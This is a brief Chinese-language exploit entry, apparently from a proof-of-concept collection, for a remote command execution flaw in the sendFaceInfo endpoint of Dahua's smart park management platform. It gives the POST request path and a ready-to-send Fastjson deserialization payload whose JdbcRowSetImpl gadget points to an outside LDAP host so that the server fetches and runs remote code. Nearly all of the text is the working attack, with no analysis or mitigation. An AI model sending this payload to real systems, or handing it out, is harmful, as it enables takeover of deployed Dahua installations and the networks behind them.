# 大华智慧园区综合管理平台-sendFaceInfo存在远程命令执行漏洞

大华 ｜ 命令执行 ｜ —
- **请求**：`POST /CardSolution/card/face/sendFaceInfo HTTP/1.1`

**Payload**
```
{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://qsudvbssue.dgrh3.cn/e","autoCommit":true}}}
```